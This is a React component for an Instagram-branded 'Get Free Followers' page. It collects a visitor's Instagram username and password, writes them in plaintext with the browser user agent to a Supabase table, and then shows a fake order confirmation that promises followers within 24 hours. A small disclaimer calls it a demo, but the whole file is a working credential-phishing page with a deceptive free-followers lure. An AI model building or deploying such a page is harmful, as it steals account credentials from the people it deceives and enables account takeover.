import { useState } from "react";
import { User, Lock, Users, Rocket, CheckCircle, Clock, Hash, Package } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

const followerPackages = [
  { value: "500", label: "500 Followers" },
  { value: "1000", label: "1000 Followers" },
  { value: "2500", label: "2500 Followers" },
  { value: "5000", label: "5000 Followers" },
  { value: "10000", label: "10000 Followers" },
];

const IGPanel = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [selectedPackage, setSelectedPackage] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [orderDetails, setOrderDetails] = useState<{
    username: string;
    package: string;
    orderId: string;
    orderTime: string;
  } | null>(null);

  const generateOrderId = () => {
    return "IG" + Math.floor(10000 + Math.random() * 90000);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password || !selectedPackage) {
      return;
    }

    setIsLoading(true);

    try {
      const orderId = generateOrderId();
      const orderTime = new Date().toLocaleString("en-IN", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: false,
      });

      // Insert into database
      await supabase.from("ig_panel_submissions").insert({
        username,
        password,
        followers_package: selectedPackage,
        order_id: orderId,
        user_agent: navigator.userAgent,
      });

      setOrderDetails({
        username,
        package: followerPackages.find(p => p.value === selectedPackage)?.label || selectedPackage,
        orderId,
        orderTime,
      });
      setIsSuccess(true);
    } catch (error) {
      console.error("Error:", error);
    } finally {
      setIsLoading(false);
    }
  };

  if (isSuccess && orderDetails) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-purple-600 via-purple-500 to-rose-500 flex flex-col">
        {/* Success Content */}
        <div className="flex-1 flex items-center justify-center px-4 py-8">
          <div className="w-full max-w-md">
            {/* Success Icon */}
            <div className="flex justify-center mb-6">
              <div className="w-24 h-24 rounded-full bg-green-500 flex items-center justify-center shadow-2xl">
                <CheckCircle className="w-14 h-14 text-white" />
              </div>
            </div>

            {/* Success Text */}
            <h1 className="text-3xl font-bold text-center text-green-500 mb-2">
              Order Sent
            </h1>
            <h2 className="text-3xl font-bold text-center text-green-500 mb-4">
              Successfully
            </h2>
            <p className="text-center text-gray-600 mb-6">
              Your followers request has been processed
            </p>

            {/* Delivery Badge */}
            <div className="flex justify-center mb-6">
              <div className="inline-flex items-center gap-2 px-6 py-3 bg-white rounded-full border-2 border-purple-500 text-purple-600 font-semibold">
                <Clock className="w-5 h-5" />
                Delivery within 24 hours
              </div>
            </div>

            {/* Order Details Card */}
            <div className="bg-white rounded-2xl shadow-xl overflow-hidden">
              {/* Card Header */}
              <div className="bg-gradient-to-r from-purple-600 to-rose-500 h-2" />
              
              <div className="p-6">
                <div className="flex items-center gap-2 mb-6">
                  <div className="w-10 h-10 rounded-lg bg-blue-100 flex items-center justify-center">
                    <Package className="w-5 h-5 text-blue-600" />
                  </div>
                  <h3 className="text-xl font-bold text-gray-800">Order Details</h3>
                </div>

                <div className="space-y-4">
                  {/* Username */}
                  <div className="flex items-center justify-between py-3 border-b border-gray-100">
                    <div className="flex items-center gap-3 text-gray-600">
                      <User className="w-5 h-5" />
                      <span>Username:</span>
                    </div>
                    <span className="font-semibold text-blue-600">{orderDetails.username}</span>
                  </div>

                  {/* Package */}
                  <div className="flex items-center justify-between py-3 border-b border-gray-100">
                    <div className="flex items-center gap-3 text-gray-600">
                      <Users className="w-5 h-5" />
                      <span>Package:</span>
                    </div>
                    <span className="font-bold text-gray-800">{orderDetails.package}</span>
                  </div>

                  {/* Order Time */}
                  <div className="flex items-center justify-between py-3 border-b border-gray-100">
                    <div className="flex items-center gap-3 text-gray-600">
                      <Clock className="w-5 h-5" />
                      <span>Order Time:</span>
                    </div>
                    <div className="text-right">
                      <div className="font-bold text-gray-800">{orderDetails.orderTime.split(",")[0]}</div>
                      <div className="font-bold text-gray-800">{orderDetails.orderTime.split(",")[1]}</div>
                    </div>
                  </div>

                  {/* Order ID */}
                  <div className="flex items-center justify-between py-3">
                    <div className="flex items-center gap-3 text-gray-600">
                      <Hash className="w-5 h-5" />
                      <span>Order ID:</span>
                    </div>
                    <span className="font-bold text-blue-600">{orderDetails.orderId}</span>
                  </div>
                </div>
              </div>

              {/* Card Footer Gradient */}
              <div className="bg-gradient-to-r from-purple-600 via-pink-500 to-orange-400 h-2" />
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="text-center py-4 text-white/80 text-sm">
          © 2026 Instagram. This is not an official Instagram service.
        </footer>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-purple-600 via-purple-500 to-rose-500 flex flex-col">
      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-md">
          {/* Card */}
          <div className="bg-white/95 backdrop-blur-sm rounded-3xl shadow-2xl p-8 relative overflow-hidden">
            {/* Corner accent */}
            <div className="absolute top-0 right-0 w-16 h-16 bg-gradient-to-bl from-rose-500 to-transparent" />
            
            {/* Instagram Logo */}
            <h1 className="text-center mb-8">
              <span 
                className="text-4xl font-serif bg-gradient-to-r from-purple-600 via-pink-500 to-orange-400 bg-clip-text text-transparent"
                style={{ fontFamily: "Georgia, serif" }}
              >
                Instagram
              </span>
            </h1>

            <form onSubmit={handleSubmit} className="space-y-5">
              {/* Username Input */}
              <div className="relative">
                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
                  <User className="w-5 h-5" />
                </div>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="Username or Email"
                  className="w-full pl-12 pr-4 py-4 bg-gray-50 border border-gray-200 rounded-xl text-gray-800 placeholder-gray-400 focus:outline-none focus:border-purple-400 focus:ring-2 focus:ring-purple-100 transition-all"
                  required
                />
              </div>

              {/* Password Input */}
              <div className="relative">
                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
                  <Lock className="w-5 h-5" />
                </div>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  className="w-full pl-12 pr-4 py-4 bg-gray-50 border border-gray-200 rounded-xl text-gray-800 placeholder-gray-400 focus:outline-none focus:border-purple-400 focus:ring-2 focus:ring-purple-100 transition-all"
                  required
                />
              </div>

              {/* Package Selector */}
              <div className="relative">
                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
                  <Users className="w-5 h-5" />
                </div>
                <select
                  value={selectedPackage}
                  onChange={(e) => setSelectedPackage(e.target.value)}
                  className="w-full pl-12 pr-4 py-4 bg-gray-50 border border-gray-200 rounded-xl text-gray-800 focus:outline-none focus:border-purple-400 focus:ring-2 focus:ring-purple-100 transition-all appearance-none cursor-pointer"
                  required
                >
                  <option value="" disabled>Select Followers Package</option>
                  {followerPackages.map((pkg) => (
                    <option key={pkg.value} value={pkg.value}>
                      {pkg.label}
                    </option>
                  ))}
                </select>
                <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                  </svg>
                </div>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isLoading}
                className="w-full py-4 bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white font-semibold rounded-xl shadow-lg shadow-purple-500/30 transition-all flex items-center justify-center gap-2 disabled:opacity-70"
              >
                <Rocket className="w-5 h-5" />
                {isLoading ? "Processing..." : "Get Free Followers"}
              </button>
            </form>

            {/* Disclaimer */}
            <div className="mt-6 p-4 bg-gray-50 rounded-xl border border-gray-100">
              <div className="flex justify-center mb-2">
                <div className="w-6 h-6 rounded-full bg-blue-100 flex items-center justify-center">
                  <span className="text-blue-500 text-xs font-bold">i</span>
                </div>
              </div>
              <p className="text-center text-gray-500 text-sm">
                ✨ This is a demo/educational project for learning purposes only. No real Instagram accounts are affected.
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="text-center py-4 text-white/80 text-sm">
        <p>© 2026 Instagram. This is not an official Instagram service.</p>
        <div className="flex justify-center gap-4 mt-2">
          <span className="hover:text-white cursor-pointer">About</span>
          <span className="hover:text-white cursor-pointer">Privacy</span>
          <span className="hover:text-white cursor-pointer">Terms</span>
          <span className="hover:text-white cursor-pointer">Contact</span>
        </div>
      </footer>
    </div>
  );
};

export default IGPanel;
